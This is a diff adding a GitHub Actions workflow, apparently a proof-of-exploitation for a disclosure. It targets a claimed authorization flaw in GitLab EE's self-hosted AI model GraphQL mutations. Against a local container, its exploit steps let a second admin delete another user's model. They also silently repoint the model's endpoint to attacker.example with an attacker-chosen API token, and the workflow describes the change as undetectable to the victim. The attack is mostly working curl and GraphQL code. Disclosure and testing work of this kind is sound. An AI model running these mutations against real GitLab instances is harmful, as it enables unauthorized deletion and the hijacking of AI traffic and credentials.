@@ -1,0 +1,181 @@
+name: GitLab IDOR PoE — aiSelfHostedModelUpdate/Delete
+
+on:
+  workflow_dispatch:
+
+jobs:
+  poe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+
+    steps:
+      - name: Start GitLab EE container
+        run: |
+          docker run -d \
+            --hostname localhost \
+            --name gitlab-idor-poe \
+            -p 8181:80 \
+            -e GITLAB_ROOT_PASSWORD="xK9mP2vL8nQ5" \
+            -e GITLAB_OMNIBUS_CONFIG="gitlab_rails['initial_root_password']='xK9mP2vL8nQ5'; gitlab_rails['gitlab_signup_enabled']=true;" \
+            --shm-size 256m \
+            gitlab/gitlab-ee:latest
+          echo "Container started: $(docker ps -q --filter name=gitlab-idor-poe)"
+
+      - name: Wait for GitLab API to be ready
+        run: |
+          echo "Waiting for GitLab to initialize..."
+          for i in $(seq 1 60); do
+            if curl -sf http://localhost:8181/api/v4/version -o /dev/null 2>/dev/null; then
+              echo "GitLab ready after $((i * 10))s"
+              break
+            fi
+            sleep 10
+            echo -n "[$((i*10))s] "
+          done
+
+      - name: Create root PAT
+        run: |
+          ROOT_PAT=$(docker exec gitlab-idor-poe \
+            gitlab-rails runner \
+            "t=User.find_by_username('root').personal_access_tokens.create!(name:'root-poe',scopes:['api'],expires_at:7.days.from_now); puts t.token" \
+            2>/dev/null | tail -1)
+          echo "ROOT_PAT=${ROOT_PAT}" >> $GITHUB_ENV
+          echo "Root PAT acquired: ${ROOT_PAT:0:8}..."
+
+      - name: Create User A and User B via REST API
+        run: |
+          USER_A_JSON=$(curl -sf -X POST "http://localhost:8181/api/v4/users" \
+            -H "Authorization: Bearer $ROOT_PAT" \
+            -H "Content-Type: application/json" \
+            -d '{"name":"Alice Admin","username":"alice_admin","email":"alice@idor-poe.test","password":"AlicePass1","admin":true,"skip_confirmation":true}')
+          echo "User A response: $USER_A_JSON"
+          USER_A_ID=$(echo "$USER_A_JSON" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('id','ERR'))")
+          echo "USER_A_ID=${USER_A_ID}" >> $GITHUB_ENV
+          echo "User A created: id=${USER_A_ID}"
+
+          USER_B_JSON=$(curl -sf -X POST "http://localhost:8181/api/v4/users" \
+            -H "Authorization: Bearer $ROOT_PAT" \
+            -H "Content-Type: application/json" \
+            -d '{"name":"Bob Admin","username":"bob_admin","email":"bob@idor-poe.test","password":"BobsPass1","admin":true,"skip_confirmation":true}')
+          echo "User B response: $USER_B_JSON"
+          USER_B_ID=$(echo "$USER_B_JSON" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('id','ERR'))")
+          echo "USER_B_ID=${USER_B_ID}" >> $GITHUB_ENV
+          echo "User B created: id=${USER_B_ID}"
+
+      - name: Create PATs for User A and User B via REST API
+        run: |
+          EXPIRES=$(date -d '+7 days' '+%Y-%m-%d')
+
+          USER_A_PAT_JSON=$(curl -sf -X POST "http://localhost:8181/api/v4/users/${USER_A_ID}/personal_access_tokens" \
+            -H "Authorization: Bearer $ROOT_PAT" \
+            -H "Content-Type: application/json" \
+            -d "{\"name\":\"alice-poe\",\"scopes\":[\"api\"],\"expires_at\":\"${EXPIRES}\"}")
+          echo "User A PAT response: $USER_A_PAT_JSON"
+          USER_A_PAT=$(echo "$USER_A_PAT_JSON" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('token','ERR'))")
+          echo "USER_A_PAT=${USER_A_PAT}" >> $GITHUB_ENV
+          echo "User A PAT: ${USER_A_PAT:0:8}..."
+
+          USER_B_PAT_JSON=$(curl -sf -X POST "http://localhost:8181/api/v4/users/${USER_B_ID}/personal_access_tokens" \
+            -H "Authorization: Bearer $ROOT_PAT" \
+            -H "Content-Type: application/json" \
+            -d "{\"name\":\"bob-poe\",\"scopes\":[\"api\"],\"expires_at\":\"${EXPIRES}\"}")
+          echo "User B PAT response: $USER_B_PAT_JSON"
+          USER_B_PAT=$(echo "$USER_B_PAT_JSON" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('token','ERR'))")
+          echo "USER_B_PAT=${USER_B_PAT}" >> $GITHUB_ENV
+          echo "User B PAT: ${USER_B_PAT:0:8}..."
+
+      - name: Discover AiAcceptedSelfHostedModels enum + confirm policy MISSING
+        run: |
+          echo "=== AiAcceptedSelfHostedModels enum values ==="
+          ENUM_RESP=$(curl -s -X POST "http://localhost:8181/api/graphql" \
+            -H "Authorization: Bearer $ROOT_PAT" \
+            -H "Content-Type: application/json" \
+            -d '{"query":"{ __type(name: \"AiAcceptedSelfHostedModels\") { enumValues { name } } }"}')
+          echo "$ENUM_RESP"
+          MODEL_ENUM=$(echo "$ENUM_RESP" | python3 -c "import sys,json; d=json.load(sys.stdin); vals=d.get('data',{}).get('__type',{}).get('enumValues',[]); print(vals[0]['name'] if vals else 'MISTRAL')")
+          echo "MODEL_ENUM=${MODEL_ENUM}" >> $GITHUB_ENV
+          echo "Using enum value: $MODEL_ENUM"
+
+          echo ""
+          echo "=== Checking for Ai::SelfHostedModelPolicy (code-layer evidence) ==="
+          docker exec gitlab-idor-poe bash -c \
+            "ls /opt/gitlab/embedded/service/gitlab-rails/ee/app/policies/ai/self_hosted_model_policy.rb 2>&1 || echo 'POLICY FILE MISSING — no per-object authorization exists'"
+
+          echo ""
+          echo "=== Vulnerable delete.rb (object_from_id instead of authorized_find!) ==="
+          docker exec gitlab-idor-poe cat \
+            /opt/gitlab/embedded/service/gitlab-rails/ee/app/graphql/mutations/ai/self_hosted_models/delete.rb 2>/dev/null || echo "FILE_NOT_FOUND"
+
+          echo ""
+          echo "=== Vulnerable update.rb ==="
+          docker exec gitlab-idor-poe cat \
+            /opt/gitlab/embedded/service/gitlab-rails/ee/app/graphql/mutations/ai/self_hosted_models/update.rb 2>/dev/null || echo "FILE_NOT_FOUND"
+
+      - name: Seed Ai::SelfHostedModel as User A (victim)
+        run: |
+          MODEL_GID=$(docker exec gitlab-idor-poe gitlab-rails runner \
+            "::Ai::SelfHostedModel.where(name:'victim-model').destroy_all rescue nil; m=::Ai::SelfHostedModel.create!(name:'victim-model',model:'mistral',endpoint:'https://victim.example/v1',api_token:'victim-secret-token'); puts 'gid://gitlab/Ai::SelfHostedModel/'+m.id.to_s" \
+            2>/dev/null | tail -1)
+          echo "MODEL_GID=${MODEL_GID}" >> $GITHUB_ENV
+          echo "Model created by User A: ${MODEL_GID}"
+
+      - name: EXPLOIT A — User B DELETES User A's model (no ownership check)
+        run: |
+          echo "=== DELETE EXPLOIT ==="
+          echo "Attacker: bob_admin (User B PAT=${USER_B_PAT:0:8}...)"
+          echo "Victim model: $MODEL_GID"
+          echo ""
+          echo "GraphQL: mutation { aiSelfHostedModelDelete(input: { id: \"$MODEL_GID\" }) { errors } }"
+          echo ""
+          DELETE_RESP=$(curl -s -X POST "http://localhost:8181/api/graphql" \
+            -H "Authorization: Bearer $USER_B_PAT" \
+            -H "Content-Type: application/json" \
+            -d "{\"query\":\"mutation { aiSelfHostedModelDelete(input: { id: \\\"$MODEL_GID\\\" }) { errors } }\"}")
+          echo "Response: $DELETE_RESP"
+          echo ""
+          if echo "$DELETE_RESP" | python3 -c "import sys,json; d=json.load(sys.stdin); e=d.get('data',{}).get('aiSelfHostedModelDelete',{}).get('errors',['PARSE']); print('RESULT: errors='+str(e)); exit(0 if e==[] else 1)" 2>/dev/null; then
+            echo "✅ DELETE IDOR CONFIRMED: errors:[] — User B deleted User A's model with no authorization check"
+          else
+            echo "DELETE check: response above"
+          fi
+
+      - name: Recreate model for UPDATE test
+        run: |
+          MODEL_GID2=$(docker exec gitlab-idor-poe gitlab-rails runner \
+            "m=::Ai::SelfHostedModel.create!(name:'victim-model-2',model:'mistral',endpoint:'https://victim.example/v1',api_token:'victim-secret-token'); puts 'gid://gitlab/Ai::SelfHostedModel/'+m.id.to_s" \
+            2>/dev/null | tail -1)
+          echo "MODEL_GID2=${MODEL_GID2}" >> $GITHUB_ENV
+          echo "Model 2 for UPDATE test: ${MODEL_GID2}"
+
+      - name: EXPLOIT B — User B silently hijacks endpoint + API token
+        run: |
+          echo "=== UPDATE EXPLOIT (silent endpoint hijack) ==="
+          echo "Attacker: bob_admin (User B PAT=${USER_B_PAT:0:8}...)"
+          echo "Target model: $MODEL_GID2  enum: $MODEL_ENUM"
+          echo ""
+          UPDATE_RESP=$(curl -s -X POST "http://localhost:8181/api/graphql" \
+            -H "Authorization: Bearer $USER_B_PAT" \
+            -H "Content-Type: application/json" \
+            -d "{\"query\":\"mutation { aiSelfHostedModelUpdate(input: { id: \\\"$MODEL_GID2\\\", name: \\\"victim-model-2\\\", model: $MODEL_ENUM, endpoint: \\\"https://attacker.example/v1\\\", apiToken: \\\"attacker-controlled-token\\\" }) { selfHostedModel { id endpoint } errors } }\"}")
+          echo "Response: $UPDATE_RESP"
+          echo ""
+          echo "$UPDATE_RESP" | python3 -c "import sys,json; d=json.loads(sys.stdin.read()); r=(d.get('data') or {}).get('aiSelfHostedModelUpdate') or {}; errors=r.get('errors',d.get('errors',['PARSE'])); ep=(r.get('selfHostedModel') or {}).get('endpoint','N/A'); print('errors:',errors); print('endpoint:',ep); print('✅ UPDATE IDOR CONFIRMED: errors:[] — endpoint replaced') if errors==[] and 'attacker' in str(ep) else None" 2>/dev/null || echo "UPDATE response: $UPDATE_RESP"
+
+      - name: Verify victim sees no change (attack is undetectable)
+        run: |
+          echo "=== VICTIM PERSPECTIVE after attack ==="
+          VICTIM_VIEW=$(curl -s -X POST "http://localhost:8181/api/graphql" \
+            -H "Authorization: Bearer $USER_A_PAT" \
+            -H "Content-Type: application/json" \
+            -d '{"query":"{ aiSelfHostedModels { nodes { id name endpoint } } }"}')
+          echo "User A sees: $VICTIM_VIEW"
+          echo "(name unchanged — endpoint silently points to attacker server — undetectable)"
+
+      - name: GitLab version + image digest
+        run: |
+          echo "=== GitLab Version ==="
+          curl -sf "http://localhost:8181/api/v4/version" \
+            -H "Authorization: Bearer $ROOT_PAT" | python3 -m json.tool || true
+          echo ""
+          echo "=== Image digest ==="
+          docker inspect gitlab-idor-poe --format '{{.Image}}' | head -1 || true
